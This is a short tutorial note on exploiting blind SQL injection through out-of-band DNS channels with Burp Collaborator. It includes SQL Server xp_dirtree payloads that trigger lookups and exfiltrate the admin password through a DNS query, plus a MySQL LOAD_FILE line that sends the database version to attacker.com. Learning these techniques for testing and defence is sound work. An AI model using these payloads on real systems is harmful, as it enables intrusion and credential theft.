# Exploiting blind SQLi using out-of-band  (OAST) techniques
#### In the context of exploiting blind SQL injections using out-of-band (OAST) techniques, when an application performs SQL queries asynchronously, traditional methods may not be effective.
#### The application continues processing the user's request in the original thread while using another thread to execute a SQL query . 
#### Unlike typical SQLi scenarios, the application's response doesn't rely on data retrieval, database errors, or query execution time. However, exploiting this vulnerability is still possible by triggering out-of-band network interactions to a controlled system. This involves using injected conditions to infer information gradually or direct exfiltrating data through network interactions.
**NOTE**: **DNS** (domain name service) is often a preferred protocol for out-of-band interactions, as many production networks permit free egress of DNS queries due to their essential role in system operation.
#### The most user-friendly and reliable tool for utilizing out-of-band techniques is **Burp Collaborator**. It functions as a server, offering custom implementation of various network services, including DNS.
#### With Burp Collaborator it's possible to identify instances when network interactions happen due to sending specific payloads to a vulnerable application.
* **Example**: To trigger a DNS query, the techniques employed are dependent on the type of database in use. For instance, consider the following input on Microsoft SQL Server, which initiates a DNS lookup on a specified domain:
* `; exec master..xp_dirtree'//32rf2f2f829f29fh29f2hf29fh2ay.burpcollaborator.net/a'--`
* Ths input prompts the database to perform a DNS lookup for the domain:
* `32rf2f2f829f29fh29f2hf29fh2ay.burpcollaborator.net`
* Burp Collaborator can then generate a unique subdomain, and by polling the Collaborator server, we can confirm when DNS lookups occur.
* Having identified a method to trigger out-of-band interactions, they can then utilize this channel to exfiltrate data from the vulnerable application.
* **For example**: 
#### `'; declare @s varchar(1024);set @s=(SELECT password FROM users WHERE username='admin');exec('master..xp_dirtree"//'+@s'+.32rf2f2f829f29fh29f2hf29fh2ay.burpcollaborator.net/a"'--`
* This input retrieves the password for the Administrator user, appends a unique Collaborator subdomain, and initiates a DNS lookup.

#### Another Example:
```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'));
```